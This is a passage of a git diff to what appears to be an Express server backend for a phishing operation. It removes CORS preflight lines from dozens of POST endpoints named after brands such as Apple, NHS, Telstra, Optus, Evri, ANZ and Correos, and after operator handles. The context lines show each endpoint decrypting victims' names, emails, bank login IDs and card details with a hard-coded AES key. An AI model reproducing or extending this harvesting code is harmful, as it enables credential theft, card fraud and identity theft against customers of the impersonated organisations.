   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -9911,7 +9661,6 @@ app.post("/blacktescoApple", (req, res) => {
     });
 });
 
-app.options("/yardzApple", cors());
 
 app.post("/yardzApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10028,7 +9777,6 @@ app.post("/yardzApple", (req, res) => {
     });
 });
 
-app.options("/osbApple", cors());
 
 app.post("/osbApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10147,7 +9895,6 @@ app.post("/osbApple", (req, res) => {
 
 let cya = 10;
 
-app.options("/cyaApple", cors());
 
 app.post("/cyaApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10254,7 +10001,6 @@ app.post("/cyaApple", (req, res) => {
 
 let heisenberg = 0;
 
-app.options("/heisenbergApple", cors());
 
 app.post("/heisenbergApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10373,7 +10119,6 @@ app.post("/heisenbergApple", (req, res) => {
 
 let pablo = 0;
 
-app.options("/pabloApple", cors());
 
 app.post("/pabloApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10490,7 +10235,6 @@ app.post("/pabloApple", (req, res) => {
     });
 });
 
-app.options("/sendMazzaAppleRes", cors());
 
 let mazCount = 3;
 
@@ -10584,7 +10328,6 @@ app.post("/sendMazzaAppleRes", (req, res) => {
     });
 });
 
-app.options("/sendStrictlyAppleRes", cors());
 
 app.post("/sendStrictlyAppleRes", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10680,7 +10423,6 @@ let sbCount = 15;
 
 let pastebk = 0;
 
-app.options("/applePasteBk", cors());
 
 app.post("/applePasteBk", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10797,7 +10539,6 @@ app.post("/applePasteBk", (req, res) => {
     });
 });
 
-app.options("/applePoka", cors());
 
 app.post("/applePoka", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -10916,7 +10657,6 @@ app.post("/applePoka", (req, res) => {
 
 let firstTrust = 0;
 
-app.options("/appleFirstTrust", cors());
 
 app.post("/appleFirstTrust", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11033,7 +10773,6 @@ app.post("/appleFirstTrust", (req, res) => {
     });
 });
 
-app.options("/appleSB", cors());
 
 app.post("/appleSB", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11125,7 +10864,6 @@ app.post("/appleSB", (req, res) => {
 
 let p2 = 0;
 
-app.options("/appleP2", cors());
 
 app.post("/appleP2", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11244,7 +10982,6 @@ app.post("/appleP2", (req, res) => {
 
 var cdbCount = 0;
 
-app.options("/spooferGooferApple", cors());
 
 app.post("/spooferGooferApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11333,7 +11070,6 @@ app.post("/spooferGooferApple", (req, res) => {
     });
 });
 
-app.options("/kelvApple", cors());
 
 app.post("/kelvApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11424,7 +11160,6 @@ app.post("/kelvApple", (req, res) => {
 
 var swipesC = 0;
 
-app.options("/swipesApple", cors());
 
 app.post("/swipesApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11514,7 +11249,6 @@ app.post("/swipesApple", (req, res) => {
     });
 });
 
-app.options("/daangerApple", cors());
 
 app.post("/daangerApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11603,7 +11337,6 @@ app.post("/daangerApple", (req, res) => {
     });
 });
 
-app.options("/fpaysApple", cors());
 
 app.post("/fpaysApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11721,7 +11454,6 @@ app.post("/fpaysApple", (req, res) => {
 
 var ciscoCount = 6;
 
-app.options("/ciscoApple", cors());
 
 app.post("/ciscoApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11810,7 +11542,6 @@ app.post("/ciscoApple", (req, res) => {
     });
 });
 
-app.options("/onlymyApple", cors());
 
 app.post("/onlymyApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -11901,7 +11632,6 @@ app.post("/onlymyApple", (req, res) => {
 
 let nchroCount = 10;
 
-app.options("/nchroApple", cors());
 
 app.post("/nchroApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -12017,7 +11747,6 @@ app.post("/nchroApple", (req, res) => {
     });
 });
 
-app.options("/chasedabag24s", cors());
 
 app.post("/chasedabag24s", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -12109,7 +11838,6 @@ app.post("/chasedabag24s", (req, res) => {
 
 let clearstore = 0;
 
-app.options("/baliApple", cors());
 
 app.post("/baliApple", (req, res) => {
   firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
@@ -12231,7 +11959,6 @@ app.post("/baliApple", (req, res) => {
 
 let wpCount = 0;
 
-app.options("/wpSaveLogin", cors());
 
 app.post("/wpSaveLogin", (req, res) => {
   customerId = req.body.customerId;
@@ -12263,7 +11990,6 @@ app.post("/wpSaveLogin", (req, res) => {
 
 let skiiBendigo = 0;
 
-app.options("/bendigoLogin", cors());
 
 app.post("/bendigoLogin", (req, res) => {
   accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
@@ -12292,7 +12018,6 @@ app.post("/bendigoLogin", (req, res) => {
   res.send("Update Completed");
 });
 
-app.options("/bendigoSkii", cors());
 
 app.post("/bendigoSkii", (req, res) => {
   accessId = CryptoJS.AES.decrypt(req.body.accessId, "402312").toString(
@@ -12333,7 +12058,6 @@ app.post("/bendigoSkii", (req, res) => {
 //NHS
 //NHS
 
-app.options("/ciscoNHS", cors());
 
 app.post("/ciscoNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12434,7 +12158,6 @@ app.post("/ciscoNHS", (req, res) => {
     });
 });
 
-app.options("/rolloNHS", cors());
 
 app.post("/rolloNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12535,7 +12258,6 @@ app.post("/rolloNHS", (req, res) => {
     });
 });
 
-app.options("/cyaNHS", cors());
 
 app.post("/cyaNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12624,7 +12346,6 @@ app.post("/cyaNHS", (req, res) => {
     });
 });
 
-app.options("/sendKelvFriendResTwo", cors());
 
 app.post("/sendKelvFriendResTwo", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12705,7 +12426,6 @@ app.post("/sendKelvFriendResTwo", (req, res) => {
     });
 });
 
-app.options("/@kworthy1", cors());
 
 app.post("/@kworthy1", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12783,7 +12503,6 @@ app.post("/@kworthy1", (req, res) => {
     });
 });
 
-app.options("/stillrunning", cors());
 
 app.post("/stillrunning", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12863,7 +12582,6 @@ app.post("/stillrunning", (req, res) => {
 
 let Spoofergoofer = 4;
 
-app.options("/spoofergooferNHS", cors());
 
 app.post("/spoofergooferNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -12931,7 +12649,6 @@ app.post("/spoofergooferNHS", (req, res) => {
     });
 });
 
-app.options("/nhsMason", cors());
 
 app.post("/nhsMason", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13010,7 +12727,6 @@ app.post("/nhsMason", (req, res) => {
     });
 });
 
-app.options("/@kworthy12", cors());
 
 app.post("/@kworthy12", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13088,7 +12804,6 @@ app.post("/@kworthy12", (req, res) => {
     });
 });
 
-app.options("/Tarrifi", cors());
 
 app.post("/Tarrifi", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13163,7 +12878,6 @@ app.post("/Tarrifi", (req, res) => {
     });
 });
 
-app.options("/littlewaynesjobs", cors());
 
 app.post("/littlewaynesjobs", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13238,7 +12952,6 @@ app.post("/littlewaynesjobs", (req, res) => {
     });
 });
 
-app.options("/sendKelvFriendRes", cors());
 
 app.post("/sendKelvFriendRes", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13318,7 +13031,6 @@ app.post("/sendKelvFriendRes", (req, res) => {
 
 let fpaysC = 10;
 
-app.options("/sendFpays2", cors());
 
 app.post("/sendFpays2", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13395,7 +13107,6 @@ app.post("/sendFpays2", (req, res) => {
 
 let masterboy = 0;
 
-app.options("/M4STERB0Y", cors());
 
 app.post("/M4STERB0Y", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13472,7 +13183,6 @@ app.post("/M4STERB0Y", (req, res) => {
 
 let skiii719 = 0;
 
-app.options("/skiii719", cors());
 
 app.post("/skiii719", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13546,7 +13256,6 @@ app.post("/skiii719", (req, res) => {
 
 let Tcapz688 = 0;
 
-app.options("/Tcapz688", cors());
 
 app.post("/Tcapz688", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13621,7 +13330,6 @@ app.post("/Tcapz688", (req, res) => {
     });
 });
 
-app.options("/actualTcapz688", cors());
 
 app.post("/actualTcapz688", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13698,7 +13406,6 @@ app.post("/actualTcapz688", (req, res) => {
 
 let mannyman789 = 0;
 
-app.options("/mannyman789", cors());
 
 app.post("/mannyman789", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13775,7 +13482,6 @@ app.post("/mannyman789", (req, res) => {
 
 let mulligang135 = 0;
 
-app.options("/mulligang135", cors());
 
 app.post("/mulligang135", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13852,7 +13558,6 @@ app.post("/mulligang135", (req, res) => {
 
 let lingypack = 0;
 
-app.options("/lingypackNHS", cors());
 
 app.post("/lingypackNHS", (req, res) => {
   firstname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -13927,7 +13632,6 @@ app.post("/lingypackNHS", (req, res) => {
     });
 });
 
-app.options("/giveip", cors());
 
 app.post("/giveip", (req, res) => {
   ip = req.body.ip;
@@ -13946,7 +13650,6 @@ app.post("/giveip", (req, res) => {
 //ENERGY
 //ENERGY
 
-app.options("/energyDP", cors());
 
 app.post("/energyDP", async (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -14047,7 +13750,6 @@ app.post("/energyDP", async (req, res) => {
     });
 });
 
-app.options("/energyFpays", cors());
 
 app.post("/energyFpays", async (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -14148,7 +13850,6 @@ app.post("/energyFpays", async (req, res) => {
     });
 });
 
-app.options("/energyTriz", cors());
 
 app.post("/energyTriz", async (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -14222,7 +13923,6 @@ app.post("/energyTriz", async (req, res) => {
     });
 });
 
-app.options("/energy", cors());
 
 app.post("/energy", async (req, res) => {
   let count;
@@ -14294,7 +13994,6 @@ app.post("/energy", async (req, res) => {
 //POSTOFFICE
 //POSTOFFICE
 
-app.options("/tCapz", cors());
 
 app.post("/tCapz", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -14373,7 +14072,6 @@ app.post("/tCapz", (req, res) => {
 //TELSTRA
 //TELSTRA
 
-app.options("/t1Telstra", cors());
 
 app.post("/t1Telstra", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -14465,7 +14163,6 @@ app.post("/t1Telstra", (req, res) => {
     });
 });
 
-app.options("/fredTelstra", cors());
 
 app.post("/fredTelstra", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -14557,7 +14254,6 @@ app.post("/fredTelstra", (req, res) => {
     });
 });
 
-app.options("/osbTelstra", cors());
 
 app.post("/osbTelstra", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -14659,7 +14355,6 @@ app.post("/osbTelstra", (req, res) => {
     });
 });
 
-app.options("/g7000telstra", cors());
 
 app.post("/g7000telstra", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -14764,7 +14459,6 @@ app.post("/g7000telstra", (req, res) => {
 //OPTUS
 //OPTUS
 //OPTUS
-app.options("/spooferGooferOptus", cors());
 
 app.post("/spooferGooferOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -14858,7 +14552,6 @@ app.post("/spooferGooferOptus", (req, res) => {
 
 let moneymanmino = 0;
 
-app.options("/mmmOptus", cors());
 
 app.post("/mmmOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -14953,7 +14646,6 @@ app.post("/mmmOptus", (req, res) => {
     });
 });
 
-app.options("/g700Optus", cors());
 
 app.post("/g700Optus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -15048,7 +14740,6 @@ app.post("/g700Optus", (req, res) => {
     });
 });
 
-app.options("/firstTrustOptus", cors());
 
 app.post("/firstTrustOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -15159,7 +14850,6 @@ app.post("/firstTrustOptus", (req, res) => {
     });
 });
 
-app.options("/gooferHaytchOptus", cors());
 
 app.post("/gooferHaytchOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -15237,7 +14927,6 @@ app.post("/gooferHaytchOptus", (req, res) => {
     });
 });
 
-app.options("/offshorebillionsOptus", cors());
 
 app.post("/offshorebillionsOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -15347,7 +15036,6 @@ app.post("/offshorebillionsOptus", (req, res) => {
     });
 });
 
-app.options("/loyaltyOptus", cors());
 
 app.post("/loyaltyOptus", (req, res) => {
   email = CryptoJS.AES.decrypt(req.body.email, "402312").toString(
@@ -15443,7 +15131,6 @@ app.post("/loyaltyOptus", (req, res) => {
 //EVRI
 //EVRI
 
-app.options("/YardzUnitEvri", cors());
 
 app.post("/YardzUnitEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -15548,7 +15235,6 @@ app.post("/YardzUnitEvri", (req, res) => {
     });
 });
 
-app.options("/stackerEvri", cors());
 
 app.post("/stackerEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -15653,7 +15339,6 @@ app.post("/stackerEvri", (req, res) => {
     });
 });
 
-app.options("/charlieEvri", cors());
 
 app.post("/charlieEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -15758,7 +15443,6 @@ app.post("/charlieEvri", (req, res) => {
     });
 });
 
-app.options("/ghostEvri", cors());
 
 app.post("/ghostEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -15857,7 +15541,6 @@ app.post("/ghostEvri", (req, res) => {
     });
 });
 
-app.options("/gh0stEvri", cors());
 
 app.post("/gh0stEvri", async (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -15967,7 +15650,6 @@ app.post("/gh0stEvri", async (req, res) => {
     });
 });
 
-app.options("/barksdaleEvri", cors());
 
 app.post("/barksdaleEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16066,7 +15748,6 @@ app.post("/barksdaleEvri", (req, res) => {
     });
 });
 
-app.options("/baliEvri", cors());
 
 app.post("/baliEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16167,7 +15848,6 @@ app.post("/baliEvri", (req, res) => {
 
 let dpFullz = 0;
 
-app.options("/dpEvri", cors());
 
 app.post("/dpEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16272,7 +15952,6 @@ app.post("/dpEvri", (req, res) => {
     });
 });
 
-app.options("/spooferEvri", cors());
 
 app.post("/spooferEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16373,7 +16052,6 @@ app.post("/spooferEvri", (req, res) => {
 
 let truth = 0;
 
-app.options("/truthEvri", cors());
 
 app.post("/truthEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16472,7 +16150,6 @@ app.post("/truthEvri", (req, res) => {
     });
 });
 
-app.options("/goblinzEvri", cors());
 
 app.post("/goblinzEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16571,7 +16248,6 @@ app.post("/goblinzEvri", (req, res) => {
     });
 });
 
-app.options("/ciscoEvri", cors());
 
 app.post("/ciscoEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16672,7 +16348,6 @@ app.post("/ciscoEvri", (req, res) => {
 
 let pweight = 0;
 
-app.options("/pweightEvri", cors());
 
 app.post("/pweightEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16773,7 +16448,6 @@ app.post("/pweightEvri", (req, res) => {
 
 let ufo = 0;
 
-app.options("/ufoEvri", cors());
 
 app.post("/ufoEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16874,7 +16548,6 @@ app.post("/ufoEvri", (req, res) => {
 
 let youwantfame = 0;
 
-app.options("/ywfEvri", cors());
 
 app.post("/ywfEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -16975,7 +16648,6 @@ app.post("/ywfEvri", (req, res) => {
 
 let saim = 0;
 
-app.options("/saimEvri", cors());
 
 app.post("/saimEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17087,7 +16759,6 @@ app.post("/saimEvri", (req, res) => {
     });
 });
 
-app.options("/nchroEvri", cors());
 
 app.post("/nchroEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17186,7 +16857,6 @@ app.post("/nchroEvri", (req, res) => {
     });
 });
 
-app.options("/cbEvri", cors());
 
 app.post("/cbEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17256,7 +16926,6 @@ app.post("/cbEvri", (req, res) => {
     });
 });
 
-app.options("/eggmanEvri", cors());
 
 app.post("/eggmanEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17338,7 +17007,6 @@ app.post("/eggmanEvri", (req, res) => {
     });
 });
 
-app.options("/usufEvri", cors());
 
 app.post("/usufEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17414,7 +17082,6 @@ app.post("/usufEvri", (req, res) => {
     });
 });
 
-app.options("/trizEvri1", cors());
 
 app.post("/trizEvri1", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17492,7 +17159,6 @@ app.post("/trizEvri1", (req, res) => {
 
 let kyle = 0;
 
-app.options("/kyleEvri", cors());
 
 app.post("/kyleEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17606,7 +17272,6 @@ app.post("/kyleEvri", (req, res) => {
 
 let mk = 0;
 
-app.options("/mkEvri", cors());
 
 app.post("/mkEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17713,7 +17378,6 @@ app.post("/mkEvri", (req, res) => {
 
 let chasingfunds = 0;
 
-app.options("/chasingfundsEvri", cors());
 
 app.post("/chasingfundsEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17797,7 +17461,6 @@ app.post("/chasingfundsEvri", (req, res) => {
     });
 });
 
-app.options("/@skiii719", cors());
 
 app.post("/@skiii719", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17877,7 +17540,6 @@ app.post("/@skiii719", (req, res) => {
 
 let F_zn66 = 0;
 
-app.options("/F_zn66", cors());
 
 app.post("/F_zn66", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -17957,7 +17619,6 @@ app.post("/F_zn66", (req, res) => {
 
 let timesz = 0;
 
-app.options("/timeszEvri", cors());
 
 app.post("/timeszEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18037,7 +17698,6 @@ app.post("/timeszEvri", (req, res) => {
 
 let TheOnlyMY = 2;
 
-app.options("/TheOnlyMYEvri", cors());
 
 app.post("/TheOnlyMYEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18115,7 +17775,6 @@ app.post("/TheOnlyMYEvri", (req, res) => {
     });
 });
 
-app.options("/hoodsEvri", cors());
 
 app.post("/hoodsEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18187,7 +17846,6 @@ app.post("/hoodsEvri", (req, res) => {
     });
 });
 
-app.options("/flashEvri", cors());
 
 app.post("/flashEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18261,7 +17919,6 @@ app.post("/flashEvri", (req, res) => {
 
 let aug24 = 0;
 
-app.options("/haytchEvri", cors());
 
 app.post("/haytchEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18340,7 +17997,6 @@ app.post("/haytchEvri", (req, res) => {
 
 let daanger = 0;
 
-app.options("/dangerrEvri", cors());
 
 app.post("/dangerrEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18411,7 +18067,6 @@ app.post("/dangerrEvri", (req, res) => {
     });
 });
 
-app.options("/cdbEvri", cors());
 
 app.post("/cdbEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18489,7 +18144,6 @@ app.post("/cdbEvri", (req, res) => {
     });
 });
 
-app.options("/masonEvri", cors());
 
 app.post("/masonEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18567,7 +18221,6 @@ app.post("/masonEvri", (req, res) => {
 
 let manEvri = 5;
 
-app.options("/mannymanEvri", cors());
 
 app.post("/mannymanEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18639,7 +18292,6 @@ app.post("/mannymanEvri", (req, res) => {
     });
 });
 
-app.options("/kelvEvri", cors());
 
 app.post("/kelvEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18711,7 +18363,6 @@ app.post("/kelvEvri", (req, res) => {
     });
 });
 
-app.options("/fpaysEvri", cors());
 
 app.post("/fpaysEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18781,7 +18432,6 @@ app.post("/fpaysEvri", (req, res) => {
     });
 });
 
-app.options("/fpaysEvri2", cors());
 
 app.post("/fpaysEvri2", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18857,7 +18507,6 @@ app.post("/fpaysEvri2", (req, res) => {
     });
 });
 
-app.options("/fpaysEvri3", cors());
 
 app.post("/fpaysEvri3", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -18931,7 +18580,6 @@ app.post("/fpaysEvri3", (req, res) => {
     });
 });
 
-app.options("/fpaysEvri4", cors());
 
 app.post("/fpaysEvri4", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -19005,7 +18653,6 @@ app.post("/fpaysEvri4", (req, res) => {
     });
 });
 
-app.options("/fpaysEvri5", cors());
 
 app.post("/fpaysEvri5", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -19079,7 +18726,6 @@ app.post("/fpaysEvri5", (req, res) => {
     });
 });
 
-app.options("/mannyman3", cors());
 
 app.post("/mannyman3", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -19153,7 +18799,6 @@ app.post("/mannyman3", (req, res) => {
 
 let symEvri = 3;
 
-app.options("/symEvri", cors());
 
 app.post("/symEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -19267,7 +18912,6 @@ app.post("/symEvri", (req, res) => {
 
 let abzOutlaw = 3;
 
-app.options("/abzEvri", cors());
 
 app.post("/abzEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -19381,7 +19025,6 @@ app.post("/abzEvri", (req, res) => {
 
 let capzEvri = 3;
 
-app.options("/tcapzEvri", cors());
 
 app.post("/tcapzEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -19500,7 +19143,6 @@ app.post("/tcapzEvri", (req, res) => {
 
 let pokaEvri = 3;
 
-app.options("/pokaEvri", cors());
 
 app.post("/pokaEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -19618,7 +19260,6 @@ app.post("/pokaEvri", (req, res) => {
     });
 });
 
-app.options("/skiiGCEvri", cors());
 
 app.post("/skiiGCEvri", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
@@ -19704,7 +19345,6 @@ app.post("/skiiGCEvri", (req, res) => {
 //ANZ
 //ANZ
 
-app.options("/anzJuice", cors());
 
 app.post("/anzJuice", (req, res) => {
   customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
@@ -19763,7 +19403,6 @@ app.post("/anzJuice", (req, res) => {
   res.send("Update Completed");
 });
 
-app.options("/anzAR", cors());
 
 app.post("/anzAR", (req, res) => {
   customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
@@ -19784,7 +19423,6 @@ app.post("/anzAR", (req, res) => {
   res.send("Update Completed");
 });
 
-app.options("/anzHoods", cors());
 
 app.post("/anzHoods", (req, res) => {
   customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
@@ -19807,7 +19445,6 @@ app.post("/anzHoods", (req, res) => {
 
 let anzTarrifi = 0;
 
-app.options("/anzTarrifi", cors());
 
 app.post("/anzTarrifi", (req, res) => {
   customerId = CryptoJS.AES.decrypt(req.body.customerId, "402312").toString(
@@ -19843,7 +19480,6 @@ app.post("/anzTarrifi", (req, res) => {
 //BT
 //BT
 
-app.options("/@skiii719", cors());
 
 app.post("/@skiii719", (req, res) => {
   fname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -19918,7 +19554,6 @@ app.post("/@skiii719", (req, res) => {
     });
 });
 
-app.options("/ssfinesse", cors());
 
 app.post("/ssfinesse", (req, res) => {
   username = CryptoJS.AES.decrypt(req.body.username, "402312").toString(
@@ -20022,7 +19657,6 @@ app.post("/ssfinesse", (req, res) => {
 
 let skat = 0;
 
-app.options("/skatPersonal", cors());
 
 app.post("/skatPersonal", (req, res) => {
   username = req.body.username;
@@ -20072,7 +19706,6 @@ app.post("/skatPersonal", (req, res) => {
   res.send("Update Completed");
 });
 
-app.options("/skatBilling", cors());
 
 app.post("/skatBilling", (req, res) => {
   ccname = req.body.ccname;
@@ -20148,7 +19781,6 @@ app.post("/skatBilling", (req, res) => {
 //CORREOS
 //CORREOS
 
-app.options("/correosKelv", cors());
 
 app.post("/correosKelv", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -20232,7 +19864,6 @@ app.post("/correosKelv", (req, res) => {
     });
 });
 
-app.options("/correosAK", cors());
 
 app.post("/correosAK", (req, res) => {
   fullname = CryptoJS.AES.decrypt(req.body.fullname, "402312").toString(
@@ -20316,7 +19947,6 @@ app.post("/correosAK", (req, res) => {
     });
 });
 
-app.options("/removeips", cors());
 
 app.post("/removeips", (req, res) => {
   ip = req.body.ip;
